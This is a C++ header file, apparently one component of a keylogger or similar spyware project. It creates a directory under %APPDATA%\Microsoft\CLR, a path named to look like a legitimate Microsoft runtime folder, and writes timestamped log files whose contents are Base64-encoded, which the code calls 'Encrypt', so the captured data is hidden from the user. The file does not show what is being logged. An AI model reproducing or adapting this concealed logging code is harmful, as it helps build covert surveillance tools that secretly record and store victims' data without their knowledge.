#pragma once
#define _SCL_SECURE_NO_DEPRECATE
#define _CRT_SECURE_NO_DEPRECATE
#ifndef _INPUT_OUTPUT_H
#define _INPUT_OUTPUT_H
// song used https://www.youtube.com/watch?v=rAChjO9nons
#include <string>
#include <cstdlib>
#include <fstream>
#include <Windows.h>
#include "Helper.h"
#include "Encrypt.h"

namespace IO
{
	std::string GetPath(const bool append_separator = false)
	{
		std::string appdata_dir(getenv("APPDATA"));
		std::string full = appdata_dir + "\\Microsoft\\CLR";
		return full + (append_separator ? "\\" : "");
	}	
	bool MakeOneDir(std::string path)
	{
		return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;

	}
	bool MakeDir(std::string path)
	{
		for (char &c : path)
		{
			if (c == '\\')
			{
				c = '\0';
				if (!MakeOneDir(path))
					return false;
				c = '\\';
			}

		}
		return true;
	}
	template <class T>
	std::string WriteLog(const T &t)
	{
		std::string path = GetPath(true);
		Helper::DateTime dt;
		std::string name = dt.GetDateTimeString("_") + ".log";
		
		try 
		{
			std::ofstream file(path + name);
			if (!file) 
				return "";

			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
			std::string data = Base64::Encrypt(s.str());
			file << data;

			if (!file)
				return "";

			file.close();
			return name;
		}
		catch (...)
		{
			return  "";
		}
	}

}

#endif // !_INPUT_OUTPUT_H

